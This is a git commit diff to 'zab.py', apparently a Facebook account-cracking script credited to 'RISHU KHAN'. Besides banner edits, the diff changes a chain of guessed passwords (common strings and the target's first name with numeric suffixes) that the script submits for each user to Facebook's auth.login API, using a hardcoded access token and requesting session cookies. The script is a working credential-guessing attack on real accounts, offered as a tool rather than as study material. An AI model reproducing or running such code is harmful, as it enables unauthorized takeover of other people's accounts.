1f7062db4456080e0ac0a76d42e8486800b53427
Alex-Zain <84902847+Alex-Zain@users.noreply.github.com>
2021-10-15 12:32:47 +0530

    Update zab.py

--- zab.py
+++ zab.py
@@ -73,21 +73,19 @@ def jalan(z):
 ##### LOGO #####
 
 logo = """
-
-\033[1;37m  ╔═══════════════════════════════════════════╗
 \033[1;37m    d8888b. d888888b .d8888. db   db db    db 
 \033[1;37m    88  `8D   `88'   88'  YP 88   88 88    88 
 \033[1;37m    88oobY'    88    `8bo.   88ooo88 88    88 
 \033[1;37m    88`8b      88      `Y8b. 88~~~88 88    88 
 \033[1;37m    88 `88.   .88.   db   8D 88   88 88b  d88 
 \033[1;37m    88   YD Y888888P `8888Y' YP   YP ~Y8888P' 
-\033[1;37m  ╚═══════════════════════════════════════════╝
+\033[1;37m  ─────────────────────────────────────────────
          [\033[1;97m\033[1;41mIF YOU DREAM IT CAN YOU DO IT\033[0m\x1b[1;37m]    
-\033[1;37m  ╔═══════════════════════════════════════════╗
+\033[1;37m  ─────────────────────────────────────────────
 \033[1;37m        \033[1;37m➤ AUTHOR   : RISHU KHAN           
 \033[1;37m        \033[1;37m➤ VERSION  : 3.0                  
 \033[1;37m        \033[1;37m➤ FACEBOOK : www.fb.com/al3x.rishu 
-\033[1;37m  ╚═══════════════════════════════════════════╝"""●●●●●●"""
+\033[1;37m  ─────────────────────────────────────────────"""
 
 def tik():
 
@@ -116,20 +114,19 @@ vuln = "\033[32mVuln"
 os.system("clear")
 
 print  
-\033[1;37m  ╔═══════════════════════════════════════════╗
 \033[1;37m    d8888b. d888888b .d8888. db   db db    db 
 \033[1;37m    88  `8D   `88'   88'  YP 88   88 88    88 
 \033[1;37m    88oobY'    88    `8bo.   88ooo88 88    88 
 \033[1;37m    88`8b      88      `Y8b. 88~~~88 88    88 
 \033[1;37m    88 `88.   .88.   db   8D 88   88 88b  d88 
 \033[1;37m    88   YD Y888888P `8888Y' YP   YP ~Y8888P' 
-\033[1;37m  ╚═══════════════════════════════════════════╝
+\033[1;37m  ─────────────────────────────────────────────
          [\033[1;97m\033[1;41mIF YOU DREAM IT CAN YOU DO IT\033[0m\x1b[1;37m]    
-\033[1;37m  ╔═══════════════════════════════════════════╗
+\033[1;37m  ─────────────────────────────────────────────
 \033[1;37m        \033[1;37m➤ AUTHOR   : RISHU KHAN           
 \033[1;37m        \033[1;37m➤ VERSION  : 3.0                  
 \033[1;37m        \033[1;37m➤ FACEBOOK : www.fb.com/al3x.rishu 
-\033[1;37m  ╚═══════════════════════════════════════════╝"""
+\033[1;37m  ─────────────────────────────────────────────
 CorrectUsername = "ok"
 
 CorrectPassword = "ok"
@@ -508,7 +505,7 @@ def pilih_super():
 
 			b = json.loads(a.text)
 
-			pass1 = ('786789')
+			pass1 = ('123456')
 
 			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 
@@ -536,7 +533,7 @@ def pilih_super():
 
 				else:
 
-					pass2 = b['first_name']+'12345'
+					pass2 = b['first_name']+'last_name'
 
 					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 
@@ -564,7 +561,7 @@ def pilih_super():
 
 						else:
 
-							pass3 = b['first_name'] + '123'
+							pass3 = b['first_name'] + ' last_name'
 
 							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 
@@ -592,7 +589,7 @@ def pilih_super():
 
 								else:
 
-									pass4 = 'Pakistan143'
+									pass4 = '1234567'
 
 									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 
@@ -620,7 +617,7 @@ def pilih_super():
 
 										else:
 
-											pass5 = b['first_name'] + '12'
+											pass5 = b['first_name'] + '@123'
 
 											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 
@@ -648,7 +645,7 @@ def pilih_super():
 
 												else:
 
-													pass6 = b['first_name'] + '1234'
+													pass6 = b['first_name'] + '123'
 
 													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 
@@ -680,7 +677,7 @@ def pilih_super():
 
 															b = json.loads(a.text)
 
-															pass7 = b['first_name'] + '789'
+															pass7 = b['first_name'] + '786'
 
 															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 
